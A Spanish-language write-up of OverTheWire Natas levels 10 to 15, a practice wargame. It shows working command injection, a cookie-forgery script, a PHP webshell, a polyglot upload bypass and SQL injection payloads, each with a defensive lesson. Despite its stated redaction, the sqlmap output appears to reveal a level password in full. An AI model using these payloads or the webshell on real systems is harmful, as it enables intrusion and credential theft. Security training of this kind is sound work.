# Writeup: OverTheWire - Natas (Niveles 10 a 15)

## Introducción
Continuación del writeup de **Natas**. Estos niveles profundizan en inyección de comandos con filtros parciales, inyección SQL, y bypass de autenticación.

> Las contraseñas y los secretos están omitidos (`[redacted]`) para no arruinar el reto a otras personas. Lo importante es el método.

---

## Natas Level 10 → Level 11
- **URL:** `http://natas10.natas.labs.overthewire.org`
- **Credenciales:** `natas10` / `[redacted]`

### Análisis y Explotación
1. La aplicación es igual a natas9, pero ahora filtra los caracteres `;`, `|` y `&` con una expresión regular:
   ```php
   if(preg_match('/[;|&]/',$key)) {
       print "Input contains an illegal character!";
   } else {
       passthru("grep -i $key dictionary.txt");
   }
   ```
2. El filtro bloquea los separadores de comandos más comunes, pero **no** los espacios, `/`, ni `.`.
3. Clave del exploit: `grep` acepta múltiples archivos como argumentos. Se puede inyectar una ruta adicional directamente en la invocación del comando sin usar separadores.
4. Payload en el campo de búsqueda:
   ```
   . /etc/natas_webpass/natas11
   ```
5. El servidor ejecuta:
   ```bash
   grep -i . /etc/natas_webpass/natas11 dictionary.txt
   ```
   El patrón `.` en regex coincide con cualquier carácter (todas las líneas), por lo que imprime el contenido completo de `/etc/natas_webpass/natas11` —la contraseña— junto con resultados del diccionario.

- **URL de explotación:**
  ```
  http://natas10.natas.labs.overthewire.org/?needle=.+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search
  ```
- **Password obtenida (`natas11`):** `[redacted]`

### Lección aprendida
Un filtro de denegación (*blocklist*) es inherentemente frágil: siempre puede quedar algún vector sin cubrir. La solución correcta es una **lista blanca** estricta que permita solo caracteres alfanuméricos (y los realmente necesarios), combinada con `escapeshellarg()`.

---

## Natas Level 11 → Level 12
- **URL:** `http://natas11.natas.labs.overthewire.org`
- **Credenciales:** `natas11` / `[redacted]`

### Análisis y Explotación
La aplicación guarda preferencias del usuario en una cookie `data`, "protegida" con XOR y luego codificada en base64. El código fuente revela el flujo completo:

```php
$defaultdata = array("showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';
    for($i=0;$i<strlen($text);$i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}

// Cookie = base64(xor(json(data), key))
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```

La password se muestra solo si `$data["showpassword"] == "yes"`.

#### Ataque: known-plaintext XOR key recovery

Como XOR es reversible y conocemos el plaintext por defecto, podemos recuperar la key:

```
key = plaintext XOR ciphertext
```

1. **Plaintext conocido** (JSON del array por defecto):
   ```
   {"showpassword":"no","bgcolor":"#ffffff"}
   ```

2. **Ciphertext**: `base64_decode(cookie_actual)`

3. **Script Python para recuperar la key y forjar la cookie:**
   ```python
   import base64, json

   cookie_b64 = "EGAgHwQ1IxYYMSQYGSZxTUksPFVHYDEQCC0/GBlgaVVIJDURDSQ1VRY="
   cipher = base64.b64decode(cookie_b64)

   known = json.dumps({"showpassword":"no","bgcolor":"#ffffff"},
                      separators=(',',':')).encode()

   # Recuperar key
   raw_key = bytes([cipher[i] ^ known[i] for i in range(len(known))])
   key = ""
   for n in range(1, len(raw_key)//2 + 1):
       pat = raw_key[:n].decode('latin-1')
       if (pat * (len(raw_key)//n + 1))[:len(raw_key)] == raw_key.decode('latin-1'):
           key = pat
           break
   print(f"Key encontrada: {key}")  # → kBSw

   # Forjar nueva cookie con showpassword=yes
   def xor_encrypt(data, key):
       return bytes([data[i] ^ ord(key[i % len(key)]) for i in range(len(data))])

   new_data = json.dumps({"showpassword":"yes","bgcolor":"#ffffff"},
                         separators=(',',':')).encode()
   new_cookie = base64.b64encode(xor_encrypt(new_data, key)).decode()
   print(f"Nueva cookie: {new_cookie}")
   ```

4. **Key recuperada:** `kBSw`
5. **Nueva cookie forjada:** `EGAgHwQ1IxYYMSQYGSZxTUk7NgRJbnEVDCE8GwQwcU1JYTURDSQ1EUk/`
6. Se reemplazó el valor de la cookie `data` en DevTools → Application → Cookies y se recargó la página.

- **Password obtenida (`natas12`):** `[redacted]`

### Lección aprendida
XOR **no es cifrado seguro** cuando se usa con una key estática y corta. Al conocer el plaintext (aquí el valor por defecto del array), se recupera la key trivialmente con una sola operación. Para proteger cookies se debe usar HMAC (firma criptográfica) o cifrado autenticado (AES-GCM), nunca XOR con key fija.

---

## Natas Level 12 → Level 13
- **URL:** `http://natas12.natas.labs.overthewire.org`
- **Credenciales:** `natas12` / `[redacted]`

### Análisis y Explotación
La aplicación permite subir un archivo JPEG (máx. 1KB). El código PHP determina la extensión del archivo guardado tomando la del campo oculto `filename` del POST — no la del archivo real:

```php
function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);  // ← usa el POST, no el archivo
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    // ...
    move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path);
}
```

Como el campo `filename` viene del cliente, se puede manipular.

#### Pasos:

1. Crear el webshell PHP:
   ```php
   <?php system($_GET["cmd"]); ?>
   ```

2. Subir cualquier archivo para capturar el POST en Burp Suite → enviar al **Repeater**.

3. En el Repeater, modificar el body del request:
   - Cambiar `filename=xxxxxxxxxx.jpg` → `filename=xxxxxxxxxx.php`
   - Reemplazar el contenido del archivo por el webshell PHP
   ```
   Content-Disposition: form-data; name="filename"

   xxxxxxxxxx.php
   ...
   Content-Disposition: form-data; name="uploadedfile"; filename="webshell.php"
   Content-Type: image/jpeg

   <?php system($_GET["cmd"]); ?>
   ```

4. Send → el servidor responde con la ruta del archivo subido:
   ```
   The file <a href="upload/inrp4kqp9e.php">upload/inrp4kqp9e.php</a> has been uploaded
   ```

5. Ejecutar comandos vía GET:
   ```
   http://natas12.natas.labs.overthewire.org/upload/inrp4kqp9e.php?cmd=cat+/etc/natas_webpass/natas13
   ```

- **Password obtenida (`natas13`):** `[redacted]`

### Lección aprendida
La extensión del archivo subido nunca debe tomarse de un campo del cliente. El servidor debe: (1) validar el tipo MIME real con `finfo`, (2) ignorar el nombre original y asignar uno propio con extensión fija, y (3) servir los uploads desde un directorio donde PHP no se ejecute (`php_flag engine off` en `.htaccess`).

---

## Natas Level 13 → Level 14
- **URL:** `http://natas13.natas.labs.overthewire.org`
- **Credenciales:** `natas13` / `[redacted]`

### Análisis y Explotación
Mismo vector que natas12 (campo `filename` controlado por el cliente), pero ahora el servidor agrega una validación de contenido real del archivo con `exif_imagetype()`:

```php
} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
} else {
    // mueve el archivo con la extensión de $_POST["filename"]
}
```

`exif_imagetype()` **no mira la extensión del nombre** — lee los primeros bytes del archivo (los *magic bytes* / firma binaria del formato) para determinar si es una imagen válida. Un JPEG válido siempre empieza con los bytes `FF D8 FF E0`.

Límite adicional: el archivo no puede superar **1000 bytes** (≈ 1 KB), lo que descarta usar imágenes reales (que suelen pesar decenas de KB).

#### Pasos:

1. Crear un archivo *polyglot* (JPEG + PHP): primero los magic bytes de JPEG, inmediatamente seguidos del payload PHP:
   ```bash
   printf '\xff\xd8\xff\xe0' > shell.php
   printf '<?php system($_GET["cmd"]); ?>' >> shell.php
   ```
   Verificar el resultado:
   ```bash
   xxd shell.php | head
   # 00000000: ffd8 ffe0 3c3f 7068 7020 7379 7374 656d  ....<?php system
   ls -la shell.php
   # ~35 bytes — muy por debajo del límite de 1000
   ```

2. Subir `shell.php` desde el formulario con Burp Intercept activo → capturar el POST → enviar al **Repeater**.

3. En el Repeater, cambiar el campo oculto `filename` de `.jpg` a `.php`:
   ```
   Content-Disposition: form-data; name="filename"

   mic30chc85.php
   ```
   El contenido del archivo (`uploadedfile`) no se toca — ya tiene los magic bytes de JPEG al inicio, por lo que pasa `exif_imagetype()`.

4. Send → el servidor valida el contenido como imagen (magic bytes JPEG presentes) y lo guarda con extensión `.php`:
   ```
   The file upload/mic30chc85.php has been uploaded
   ```

5. Ejecutar el webshell vía GET:
   ```
   http://natas13.natas.labs.overthewire.org/upload/mic30chc85.php?cmd=cat+/etc/natas_webpass/natas14
   ```
   La salida incluye ruido binario al inicio (los magic bytes de JPEG mezclados con el output del `cat`). Se confirmó el tamaño correcto del archivo de password:
   ```
   ?cmd=wc+-c+/etc/natas_webpass/natas14
   # → 33 bytes (32 caracteres + salto de línea)
   ```
   Quitando los bytes basura del inicio, la password completa de 32 caracteres queda:

- **Password obtenida (`natas14`):** `[redacted]`

### Lección aprendida
`exif_imagetype()` valida únicamente la cabecera del archivo — es trivial anteponer los magic bytes de un formato de imagen válido y adjuntar cualquier payload después. La defensa robusta contra uploads maliciosos requiere **reprocesar la imagen completa** con una librería de imágenes (p. ej. recomprimirla con GD o Imagick), lo que destruye cualquier dato externo al formato. Además, los uploads deben servirse desde un directorio sin permisos de ejecución (`php_flag engine off`).

---

## Natas Level 14 → Level 15
- **URL:** `http://natas14.natas.labs.overthewire.org`
- **Credenciales:** `natas14` / `[redacted]`

### Análisis y Explotación
La aplicación muestra un formulario de login (username + password). El código construye la query SQL concatenando los inputs del usuario **directamente**, sin sanitización:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";

if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
    echo "Successful login! The password for natas15 is <censored>";
} else {
    echo "Access denied!";
}
```

Si la query retorna al menos una fila, el login pasa. No hay prepared statements ni escape de caracteres.

#### Ataque: SQL Injection — login bypass con `OR 1=1`

La query se arma pegando partes fijas con el input del usuario:

```
SELECT * from users where username="[TU INPUT]" and password="[TU INPUT]"
```

Al meter una comilla doble (`"`) dentro del campo `username`, se cierra antes de tiempo el string del username — y lo que venga después de esa comilla se interpreta como **código SQL nuevo**, no como texto.

**Payload en el campo username:**
```
" or 1=1 -- 
```
(con un espacio después de los dos guiones)

**Password:** cualquier cosa (ej. `xxx`) — queda comentada y no importa.

**Query resultante:**
```sql
SELECT * from users where username="" or 1=1 -- " and password="xxx"
```

Desglose:
- `username=""` → string vacío, nadie en la DB tiene ese username
- `or 1=1` → siempre verdadero; el `OR` convierte toda la condición `WHERE` en TRUE
- `-- ` → comentario SQL; anula todo lo que sigue, incluyendo la validación de password

La query retorna todas las filas de la tabla → `mysqli_num_rows() > 0` → login exitoso.

- **Password obtenida (`natas15`):** `[redacted]`

### Lección aprendida
La concatenación directa de input del usuario en queries SQL es la causa raíz de SQL Injection. La defensa correcta es usar **prepared statements** (sentencias preparadas) con parámetros enlazados (`?` o `:nombre`), de modo que el motor SQL nunca interprete el input como código. Con `mysqli`:

```php
$stmt = mysqli_prepare($link, "SELECT * from users where username=? and password=?");
mysqli_stmt_bind_param($stmt, "ss", $_REQUEST["username"], $_REQUEST["password"]);
mysqli_stmt_execute($stmt);
```

Así, cualquier comilla o palabra SQL que meta el usuario queda como texto literal, nunca como instrucción.

---

## Natas Level 15 → Level 16
- **URL:** `http://natas15.natas.labs.overthewire.org`
- **Credenciales:** `natas15` / `[redacted]`

### Análisis y Explotación
La aplicación solo tiene un campo de búsqueda de username y responde con dos mensajes posibles: `"This user exists."` o `"This user doesn't exist."` — nunca muestra datos de la DB directamente. El código:

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
$res = mysqli_query($link, $query);
if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.";
    } else {
        echo "This user doesn't exist.";
    }
}
```

No hay output de datos — solo una respuesta booleana. Esto es **Blind SQL Injection**: la única información disponible es verdadero/falso.

#### Concepto: Blind Boolean-based SQLi

La idea es hacer preguntas de sí/no sobre los datos: *"¿El primer carácter de la password de natas16 es 'a'?"*. Si el servidor responde `"This user exists."` → es verdadero. Se itera sobre todos los caracteres posibles hasta reconstruir la password completa.

El payload por carácter usa `LIKE BINARY` (case-sensitive):
```sql
natas16" AND password LIKE BINARY "a%"-- 
```

Esto transforma la query en:
```sql
SELECT * from users where username="natas16" AND password LIKE BINARY "a%"
```
- Si la password empieza con `a` → retorna fila → `"This user exists."` ✓
- Si no → no retorna filas → `"This user doesn't exist."` ✗

Se repite para cada posición: `a%`, `ab%`, `abc%`, etc., hasta tener los 32 caracteres.

#### Herramienta: sqlmap con `--prefix` / `--suffix`

Como la inyección usa comillas dobles (no simples), sqlmap no la detecta con sus probes por defecto. Se deben especificar el prefijo y sufijo del punto de inyección:

```bash
sqlmap -u "http://natas15.natas.labs.overthewire.org/" \
  --data='username=natas16' \
  --auth-type=Basic \
  --auth-cred="natas15:[redacted]" \
  -p username \
  --technique=B \
  --dbms=mysql \
  --prefix='"' \
  --suffix='-- -' \
  --dump
```

- `--prefix='"'` → le dice a sqlmap que el punto de inyección cierra con una `"` antes del payload
- `--suffix='-- -'` → comenta el resto de la query
- `--technique=B` → solo boolean-based blind (el único disponible aquí)
- `--dump` → vuelca toda la tabla `users`

sqlmap identificó la inyección, enumeró la DB `natas15`, tabla `users`, y extrajo todas las filas:

```
Database: natas15
Table: users
[4 entries]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 6P151OntQe                       | bob      |
| HLwuGKts2w                       | charlie  |
| hROtsfM734                       | alice    |
| Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb | natas16  |
+----------------------------------+----------+
```

- **Password obtenida (`natas16`):** `[redacted]`

### Lección aprendida
Blind SQLi demuestra que incluso sin output de datos, una respuesta booleana es suficiente para exfiltrar información completa — solo toma más requests (máx. 62 × 32 = 1984 para un charset alfanumérico de 32 chars). La defensa es idéntica a SQLi clásica: **prepared statements**. El hecho de que la app no muestre datos no la protege si la query es injectable.

---
